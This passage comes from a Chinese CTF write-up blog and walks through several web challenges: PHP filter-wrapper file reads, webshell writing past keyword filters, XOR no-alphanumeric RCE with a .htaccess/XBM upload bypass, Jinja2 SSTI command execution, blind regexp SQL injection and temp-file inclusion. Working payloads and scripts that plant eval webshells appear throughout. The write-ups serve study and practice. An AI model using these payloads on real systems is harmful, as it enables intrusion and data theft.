#判断body是否有效，是否存在json数据，是否存在json[&#39;page&#39;]数据   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #读取page中得内容  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#匹配过滤关键字ctfecho json_encode([&#39;content&#39; =&gt; $content]); #将content进行json编码并输出</code></pre><p>在json中，字符Unicode编码之后等同于该字符，比如php等同于\u0070\u0068\u0070。</p><p>构造payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>编码下</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>解码</p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>代码审计</p><p><code>$a ?? 0 等同于 isset($a) ? $a : 0。</code></p><p>首先爆出路径</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><pre><code>过滤了空格‘ ’可以用 \t或者%09(需要php环境) 代替</code></pre><p>构造payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>代码审计</p><p>源码贴上来：</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctf刷题-第一周题目/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)成功出来phpinfo，看一看有没有可以利用的点[![image-20220210152650640](ctf刷题-第一周题目/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)发现执行系统的命令全被禁用了，看来rce走不通了。这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了[![image-20220210152821670](ctf刷题-第一周题目/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。既然rce走不通，那就试一试文件上传吧[![image-20220210152933281](ctf刷题-第一周题目/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。但是上传.htaccess仍然有[![image-20220210204915083](ctf刷题-第一周题目/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)这个函数限制。解决这个函数，采用xbm格式，X Bit Map```在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。所以我们在.htaccess里加上```#define width 1337#define height 1337..........```就可以绕过绕过这个函数了。上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对<?进行了检测。这里有两种方法可以绕过。1、对一句话木马的内容进行base64编码。2、使用 utf-16be 来绕过下面先附上两种方法的exp：1、```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```本题php环境为7.2，所以无法使用`<script language="php">eval($_REQUEST['shell']);</script>`这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。得到[![image-20220210212049717](ctf刷题-第一周题目/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2、```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```同理上传即可[![image-20220210212639842](ctf刷题-第一周题目/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)一句话木马成功利用。使用蚁剑成功连接[![image-20220210212824536](ctf刷题-第一周题目/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)但是无法访问根目录。非预期解：采用蚁剑自带插件进行绕过.[![image-20220210213427872](ctf刷题-第一周题目/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)预期解：绕过open_basedir这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctf刷题-第一周题目/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)所有文件被列举出来了，下面读取flag值就可以了。[![image-20220210214447849](ctf刷题-第一周题目/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 这道题是模板注入。 [![image-20220211102608147](ctf刷题-第一周题目 image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) 首先查看源代码，并没有什么用。 [![image-20220211102910418](ctf刷题-第一周题目 image-20220211102910418.png)](https: image-20220211102910418.png) dirsearch爆破一下，什么也没有。 [![image-20220211102929099](ctf刷题-第一周题目 image-20220211102929099.png)](https: image-20220211102929099.png) 本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。 我们这里采用arjun工具进行爆破。工具链接：https: github.com s0md3v arjun [![image-20220211110028885](ctf刷题-第一周题目 image-20220211110028885.png)](https: image-20220211110028885.png)最终可爆破出来参数name。 [![image-20220211105238512](ctf刷题-第一周题目 image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctf刷题-第一周题目 image-20220211105250064.png)](https: image-20220211105250064.png) 测试了一下的确存在模板注入。 接下来就是对漏洞的利用。 **漏洞利用** **1、工具tplmap** [![image-20220211110242684](ctf刷题-第一周题目 image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctf刷题-第一周题目 image-20220211110254561.png)](https: image-20220211110254561.png) 成功，发现为jinja2模板，在ctf题目中经常考察 直接–os-shell拿下shell，读取flag [![image-20220211110436293](ctf刷题-第一周题目 image-20220211110436293.png)](https: image-20220211110436293.png) **2、手工利用** 只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。 具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。 [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flak框架 ) 首先给几个比较通用的payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctf刷题-第一周题目 image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __   是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins   __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__   builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>同理，可以利用的类还有很多啊，</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p><p>进去以后直接给你了sql语句。</p><p>先不管别的扫一下目录再说</p><p>发现xxx/robots.txt文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>再到hin.txt查看<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>给出了过滤得字符串，并且说的很明白如果得到admin得密码就可以得到flag，但是这里得过滤是非常严格得。</p><p>fuzz一下</p><p>发现regexp没有被过滤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sql语句是</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>我们可以再username中加反斜杠注释掉单引号</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>对a进行一个简单得fuzz，判断成功时得响应包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>发现y，响应包是一个302跳转，到welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>根据这个就可以编写出payload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # 猜测密码由数字，小写字母和下划线组成for i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>进去直接显示这个</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>查看源代码，疑似hash长度扩展攻击</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>抓取请求包，发现hash值</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>直接pass传一下，发现提示文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>发现文件包含</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>扫一下目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>读取下源码</p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>由于伪协议被过滤，所以我们不能利用伪协议进行写马，这里考察得是php临时文件包含</p><p>php7 segment fault特性:<br>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</p><p>具体可参阅文章:<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>查看dir.php，成功写入文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>执行一句话木马，flag在phpinfo中</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>没有什么发现，尝试访问下secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>那我就把secret当作参数，传入一个值试一试</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>很明显，它把我输入得值进行了一个加密</p><p>没有什么发现，随便输入一些字符串，它就爆错了，，，</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>寻找可利用的信息</p><p><img 